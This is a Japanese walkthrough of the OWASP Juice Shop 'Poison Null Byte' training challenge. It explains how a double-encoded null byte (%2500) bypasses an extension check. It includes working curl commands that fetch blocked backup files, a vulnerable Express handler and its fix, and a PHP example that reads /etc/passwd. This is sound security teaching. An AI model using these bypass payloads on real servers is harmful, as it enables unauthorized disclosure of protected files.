# Poison Null Byte ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** バイパス / ファイルアクセス制御
**目標:** 本来ダウンロードできないファイルを取得する

---

## 背景知識

### Null Byte (ヌルバイト) とは

Null Byte は、**文字コード 0x00（0）の特殊な文字**。C言語やその派生言語では、**文字列の終端**を示すために使われる。

```
┌─────────────────────────────────────────────────────────────────┐
│                     C言語での文字列表現                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  文字列 "Hello" のメモリ上の表現:                                │
│                                                                 │
│  ┌───┬───┬───┬───┬───┬────┐                                    │
│  │ H │ e │ l │ l │ o │ \0 │  ← NULL (0x00) で終端               │
│  └───┴───┴───┴───┴───┴────┘                                    │
│                                                                 │
│  NULL 以降は無視される:                                         │
│                                                                 │
│  ┌───┬───┬───┬───┬───┬────┬───┬───┬───┬───┐                    │
│  │ H │ e │ l │ l │ o │ \0 │ W │ o │ r │ d │                    │
│  └───┴───┴───┴───┴───┴────┴───┴───┴───┴───┘                    │
│                           ↑                                     │
│                    ここで終了、"Word" は読まれない               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Poison Null Byte 攻撃の原理

異なる言語/ライブラリ間で、Null Byte の扱いが異なることを悪用:

```
┌─────────────────────────────────────────────────────────────────┐
│              Poison Null Byte 攻撃の仕組み                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者が送信: package.json.bak%00.md                           │
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │            Webフレームワーク (JavaScript/Python等)          │ │
│  │                                                            │ │
│  │  ファイル名: "package.json.bak\0.md"                       │ │
│  │  拡張子チェック: 末尾が ".md" → OK! ✓                      │ │
│  │                                                            │ │
│  └───────────────────────────────┬────────────────────────────┘ │
│                                  │ ファイル読み込みを依頼        │
│                                  ▼                              │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │            OSレベル / C言語ライブラリ                       │ │
│  │                                                            │ │
│  │  ファイル名: "package.json.bak" ← \0以降は無視!            │ │
│  │  実際に開くファイル: package.json.bak                      │ │
│  │                                                            │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                 │
│  結果: .bak ファイルが .md として返される 😱                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

郵便局で「住所の偽装」をする場面を想像してください:

- **送りたい場所**: 「秘密の金庫室」（アクセス禁止）
- **偽装した宛先**: 「秘密の金庫室\0 一般受付」
- **郵便局のチェック**: 「一般受付」宛て → 配達OK!
- **実際の配達先**: 配達員が `\0` で切り捨て →「秘密の金庫室」に到着

---

## 思考プロセス

### ステップ1: ファイルダウンロード制限を確認

```
「/ftp ディレクトリに色々なファイルがある」
    ↓
「.md, .pdf → 普通にダウンロードできる」
    ↓
「.bak (バックアップ) をクリック → 403 Forbidden!」
    ↓
「拡張子によるアクセス制御がある」
```

### ステップ2: 制限の仕組みを推測

```
「許可: .md, .pdf など」
「拒否: .bak, .js, etc.」
    ↓
「おそらく拡張子のホワイトリスト/ブラックリストがある」
    ↓
「末尾の拡張子をチェックしているはず」
```

### ステップ3: バイパス方法を検討

```
「.bak.md にリネームすれば？」
    ↓
「ファイルが存在しないからエラーになる」
    ↓
「チェックでは .md、実際のファイル名は .bak にする方法は？」
    ↓
「Null Byte で文字列を切り捨てられないか？」
```

### ステップ4: Null Byte インジェクション

```
「package.json.bak%00.md を試す」
    ↓
「拡張子チェック: 末尾 .md → 許可」
「ファイルシステム: %00 以降を無視 → .bak を開く」
```

### ステップ5: ダブルエンコードの必要性

```
「%00 を直接送ると...」
    ↓
「ブラウザやWebサーバーが先にデコードしてしまう」
    ↓
「デコードされた NULL はリクエストを壊す可能性」
    ↓
「%2500 (ダブルエンコード) を使う」
    ↓
「1回目のデコード: %2500 → %00」
「2回目のデコード: %00 → NULL (ファイルシステムで)」
```

---

## 実行手順

### Step 1: FTPディレクトリを確認

`http://localhost:3000/ftp` にアクセスして、ファイル一覧を確認:

```
acquisitions.md       ← ダウンロード可能
coupons_2013.md.bak   ← 403 Forbidden!
eastere.gg            ← 403 Forbidden!
package.json.bak      ← 403 Forbidden!
quarantine/           ← ディレクトリ
...
```

### Step 2: 直接アクセスを試す（失敗）

```
http://localhost:3000/ftp/package.json.bak
→ 403 Forbidden - Only .md and .pdf files are allowed
```

### Step 3: Poison Null Byte でバイパス

```
http://localhost:3000/ftp/package.json.bak%2500.md
```

**URL の解説:**

| パート | 意味 |
|--------|------|
| `/ftp/` | FTPディレクトリ |
| `package.json.bak` | 取得したいファイル |
| `%2500` | ダブルエンコードされた NULL (`%00` → `%2500`) |
| `.md` | 拡張子チェックをパスするための偽の拡張子 |

### Step 4: ファイル内容を確認

`package.json.bak` の内容が表示される:

```json
{
  "name": "juice-shop",
  "version": "12.0.0",
  "dependencies": {
    "express": "4.17.1",
    "sanitize-html": "1.4.2",  ← 脆弱なバージョン!
    ...
  }
}
```

---

## URL エンコーディングの解説

### シングルエンコード vs ダブルエンコード

```
┌─────────────────────────────────────────────────────────────────┐
│                    エンコーディングの階層                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【シングルエンコード】                                          │
│  元の文字:     %      0      0                                  │
│  エンコード:   %25    30     30     = %2500 ではない            │
│                                                                 │
│  NULL文字のシングルエンコード = %00                             │
│                                                                 │
│  【ダブルエンコード】                                            │
│  NULL文字 → %00 → %2500                                        │
│                                                                 │
│  %     →  %25                                                   │
│  %00   →  %25 + 00 = %2500                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    デコードの流れ                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  URL: package.json.bak%2500.md                                  │
│                                                                 │
│  1. Webサーバーがデコード:                                       │
│     %2500 → %00                                                 │
│     結果: package.json.bak%00.md                                │
│                                                                 │
│  2. 拡張子チェック (高水準言語):                                 │
│     "package.json.bak%00.md".endsWith(".md") → true            │
│     チェック通過! ✓                                             │
│                                                                 │
│  3. ファイルシステムアクセス (低水準):                           │
│     %00 (NULL) で文字列が終端                                   │
│     実際に開く: "package.json.bak"                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### よく使うエンコード

| 文字 | シングル | ダブル | 用途 |
|------|----------|--------|------|
| NULL | `%00` | `%2500` | 文字列の切り捨て |
| `/` | `%2F` | `%252F` | パストラバーサル |
| `\` | `%5C` | `%255C` | Windowsパス |
| `.` | `%2E` | `%252E` | 拡張子の偽装 |
| `?` | `%3F` | `%253F` | クエリ文字列 |

---

## 取得できるファイル一覧

Poison Null Byte で取得できる重要なファイル:

| ファイル | 内容 | 攻撃への活用 |
|----------|------|-------------|
| `package.json.bak` | 依存関係 | 脆弱なライブラリの特定 |
| `coupons_2013.md.bak` | 過去のクーポン | クーポン偽造の手がかり |
| `eastere.gg` | イースターエッグ | 隠しコンテンツの発見 |

```bash
# 各ファイルの取得コマンド
curl "http://localhost:3000/ftp/package.json.bak%2500.md"
curl "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
curl "http://localhost:3000/ftp/eastere.gg%2500.md"
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
const path = require('path');

app.get('/ftp/:filename', (req, res) => {
  const filename = req.params.filename;
  const ext = path.extname(filename);  // 拡張子を取得

  // 許可された拡張子かチェック
  if (!['.md', '.pdf'].includes(ext)) {
    return res.status(403).send('Forbidden');
  }

  // ファイルを送信（NULL byte が含まれると問題）
  const filepath = path.join('/ftp', filename);
  res.sendFile(filepath);  // ← NULL以降が切り捨てられる可能性
});
```

### 問題点

1. `path.extname()` は NULL バイトを考慮しない
2. ファイルシステム操作時に NULL で切り捨てられる
3. 拡張子チェックとファイルアクセスで異なる文字列が使われる

---

## 安全な実装

```javascript
// ✅ 安全なコード
const path = require('path');

app.get('/ftp/:filename', (req, res) => {
  let filename = req.params.filename;

  // 1. NULL バイトを除去
  filename = filename.replace(/\0/g, '');

  // 2. パストラバーサルを防止
  filename = path.basename(filename);

  // 3. ホワイトリストチェック
  const allowedFiles = ['readme.md', 'license.pdf'];
  if (!allowedFiles.includes(filename)) {
    return res.status(403).send('Forbidden');
  }

  // 4. 安全にファイルを送信
  const filepath = path.join('/ftp', filename);
  res.sendFile(filepath);
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **NULL除去** | 入力から `\0` を削除 |
| **正規化** | `path.normalize()` + `path.basename()` でパスを安全に |
| **ホワイトリスト** | 許可するファイルを明示的に列挙 |
| **最新ライブラリ** | Node.js 8.5+ は NULL バイト攻撃に対策済み |

---

## 歴史的背景

Poison Null Byte 攻撃は、2000年代に PHP で多発:

```php
// 古いPHPの脆弱なコード
$file = $_GET['file'];
include($file . '.php');  // 攻撃者: ?file=../../../etc/passwd%00
// → include('../../../etc/passwd');  .php が切り捨てられる
```

現在は多くの言語/フレームワークで対策済みだが、古いシステムやカスタム実装では依然として危険。

---

## 関連チャレンジ

- [Forgotten Developer Backup](forgotten-developer-backup.md) - package.json.bak の活用
- [Easter Egg](easter-egg.md) - eastere.gg の発見
- [Forged Coupon](../difficulty-5-6/forged-coupon.md) - クーポンファイルの活用
- [Confidential Document](../difficulty-1/confidential-document.md) - FTPの発見

## 参考リンク

- [OWASP - Null Byte Injection](https://owasp.org/www-community/attacks/Embedding_Null_Code)
- [CWE-158: Improper Neutralization of Null Byte](https://cwe.mitre.org/data/definitions/158.html)
- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
